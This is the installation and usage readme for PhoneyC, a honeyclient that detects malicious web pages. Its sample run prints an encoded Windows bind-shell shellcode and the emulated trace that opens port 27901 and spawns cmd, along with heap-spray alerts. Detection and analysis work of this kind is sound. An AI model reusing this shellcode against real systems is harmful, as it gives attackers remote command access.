Requirements:
=============

* libemu-svn
  Homepage: http://libemu.carnivore.it/
  Get the libemu code via Git and build it as documented on the reference
  website 
    
* curl
  Homepage: http://curl.haxx.se/


Compile the modules:
====================

(Optional) 
If you need to compile the modules with a specific Python version you can 
do it through the PHONEYC_PYTHON environment variable i.e. simply exporting 
the variable this way before moving on 

    $ export PHONEYC_PYTHON=python2.5

will force the build system to use python2.5 instead of the default one. 
Otherwise skip this step.

(Required)

* Option #1

Build the code executing these commands 

    $ cd modules
    $ make
    $ make install

Please note that you don't need root privileges when running `make install'.
This option could cause you a few troubles at compile time. In such case
please refer to option #2.

* Option #2

This is the most simple and straightforward way to install PhoneyC but it 
requires root privileges. This option should be used as a fallback in case 
option #1 raises some troubles.

If you're running PhoneyC on one of the following Linux distributions

	* Debian
	* Ubuntu
	* Gentoo

you can build the code by simply running

	# make [debian|ubuntu|gentoo] 

and everything should be setup properly.


Test the installation:
======================

In order to test the installation simply run it on a sample malicious 
page in samples/ directory as shown below. 

buffer@alnitak ~/honeynet/phoneyc $ python phoneyc.py file://samples/4158.html
[2011-01-17 11:32:47] [ALERT] NeoTracePro.TraceTarget overflow in arg0
Log written into: log/ad5048081277127857aad08e0bfd5e55

====================================
|--------AID:1----------
|ATYPE:ALERT_SHELLCODE
|MESSAGE:Shellcode Detected!
|MISC:{}
|LENGTH:752
|SHELLCODE:
eb0359eb05e8f8ffffff494937494949494949494949494949494949515a6a625830423050416b41417232414241423242413042415838414250757a496b4c435a586b726d4d385969496f496f696f51704c4b324c446441344e6b4735474c4e6b634c7445325853315a4f4c4b726f75486e6b536f57503661486b63794e6b70346c4b64416a4e54714f304f696e4c6b344f30516444475a61395a544d44416f324a4b4964656b42746464713861655a456e6b636f65746551786b55366c4b666c504b4c4b514f476c4551786b7773546c6e6b4e69724c6134576c42414f3346514b6b31744c4b715350304c4b6150666c6c4b3430376c4c6d4c4b47306778414e73586e6e326e766e5a4c76304b4f48564246727375364358347374724248543732533472736f42746b4f7a707068584b586d4b4c774b30504b4f5a76536f6d594b5563564f716a4d533834426635724a4442396f385050686e3964494b456e4d30574b4f49465363305363633633536331535143304333634b4f4a7050667178496d524c435656334c494d316e7550684c64345a50706f374637396f4e36706a745043617635796f585061786d744e4d764e6d395277796f4e3633633365496f4a705358497537394e66704946374b4f4e366630763466346635696f48507a33424839777079784631695057396f6b665365696f68506536735a6534706631785173724d6f796d35317a427066394139584c6e694867735a73746e696a423741395038736c6a4b4e7732446d4b4e4732646c6d436e6d707a30386c6b6c6b4e4b635870724b4e4e5356764b694867735a73746e696a423741395038736c6a4b4e7732446d4b4e4732646c6d436e6d707a30386c6b6c6b4e4b635870724b4e4e5356764b4f42553044596f7946636b70577272727146315051324a64417051327141454631396f6a7063584c6d6e395775584e4363496f6b66517a4b4f6b4f7567696f68504e6b3637396c4c4338445064496f5a764632496f7a7075386c306e6a4554714f46336b4f4e366b4f6e3062
|Now run it:
[{'rettype': 'HMODULE', 'retval': 1906376704, 'name': 'LoadLibraryA', 'arguments': [('LPCTSTR', 'lpFileName', ('', '', 'ws2_32'))]}, {'rettype': 'int', 'retval': 0, 'name': 'WSAStartup', 'arguments': [('WORD', 'wVersionRequested', 2), ('LPWSADATA', 'lpWSAData', 1244276)]}, {'rettype': 'SOCKET', 'retval': 66, 'name': 'WSASocket', 'arguments': [('int', 'af', 2), ('int', 'type', 1), ('int', 'protocol', 0), ('LPWSAPROTOCOL_INFO', 'lpProtocolInfo', 0), ('GROUP', 'g', 0), ('DWORD', 'dwFlags', 0)]}, {'rettype': 'int', 'retval': 0, 'name': 'bind', 'arguments': [('SOCKET', 's', 66), ('sockaddr_in *', 'name', ('', '', [('short', 'sin_family', 2), ('unsigned short', 'sin_port', 27901), ('in_addr', 'sin_addr', [('unsigned long', 's_addr', '0.0.0.0')]), ('char', 'sin_zero', '       ')])), ('int', 'namelen', 16)]}, {'rettype': 'int', 'retval': 0, 'name': 'listen', 'arguments': [('SOCKET', 's', 66), ('int', 'backlog', 2)]}, {'rettype': 'SOCKET', 'retval': 68, 'name': 'accept', 'arguments': [('SOCKET', 's', 66), ('sockaddr *', 'addr', ('', '', [])), ('int', 'addrlen', None)]}, {'rettype': 'int', 'retval': 0, 'name': 'closesocket', 'arguments': [('SOCKET', 's', 66)]}, {'rettype': 'BOOL', 'retval': -1, 'name': 'CreateProcess', 'arguments': [('LPCWSTR', 'pszImageName', ('', '', 'g\x12')), ('LPCWSTR', 'pszCmdLine', ('', '', 'cmd')), ('LPSECURITY_ATTRIBUTES', 'psaProcess', None), ('LPSECURITY_ATTRIBUTES', 'psaThread', None), ('BOOL', 'fInheritHandles', 1), ('DWORD', 'fdwCreate', 0), ('LPVOID', 'pvEnvironment', None), ('LPWSTR', 'pszCurDir', None), ('LPSTARTUPINFOW', 'psiStartInfo', ('', '', [('DWORD', 'cb', 0), ('LPTSTR', 'lpReserved', 0), ('LPTSTR', 'lpDesktop', 0), ('LPTSTR', 'lpTitle', 0), ('DWORD', 'dwX', 0), ('DWORD', 'dwY', 0), ('DWORD', 'dwXSize', 0), ('DWORD', 'dwYSize', 0), ('DWORD', 'dwXCountChars', 0), ('DWORD', 'dwYCountChars', 0), ('DWORD', 'dwFillAttribute', 0), ('DWORD', 'dwFlags', 0), ('WORD', 'wShowWindow', 0), ('WORD', 'cbReserved2', 0), ('LPBYTE', 'lpReserved2', 0), ('HANDLE', 'hStdInput', 0), ('HANDLE', 'hStdOutput', 0), ('HANDLE', 'hStdError', 0)])), ('PROCESS_INFORMATION', 'pProcInfo', ('', '', [('HANDLE', 'hProcess', 4711), ('HANDLE', 'hThread', 4712), ('DWORD', 'dwProcessId', 4712), ('DWORD', 'dwThreadId', 4714)]))]}, {'rettype': 'DWORD', 'retval': 0, 'name': 'WaitForSingleObject', 'arguments': [('HANDLE', 'hHandle', 4712), ('DWORD', 'dwMilliseconds', -1)]}]

====================================
|--------AID:2----------
|ATYPE:ALERT_HEAPSPRAY
|MESSAGE:Heapspray Detected!
|HIT:8
|MEMUSAGE:4193496
|LENGTH:4193496
|ENTROPY:0.0
|MISC:{'sledge_char': 'A', 'sec_char_cnt': 0, 'sledge_cnt': 4193496, 'sec_char': '\x00'}

====================================
|--------AID:3----------
|ATYPE:ALERT_HEAPSPRAY
|MESSAGE:Heapspray Detected!
|HIT:1
|MEMUSAGE:4193496
|LENGTH:4193496
|ENTROPY:0.0
|MISC:{'sledge_cnt': 4193496, 'sec_char_cnt': 0, 'sec_char': '\x00', 'sledge_char': 'A'}

====================================
|--------AID:4----------
|ATYPE:ALERT_HEAPSPRAY
|MESSAGE:Heapspray Detected!
|HIT:20
|MEMUSAGE:83884960
|LENGTH:4194248
|ENTROPY:0.00344388991898
|MISC:{'sledge_char': 'A', 'sec_char_cnt': 33, 'sledge_cnt': 4193514, 'sec_char': 'K'}


Run it:
=======

   $ python phoneyc.py URL-you-what-to-examine

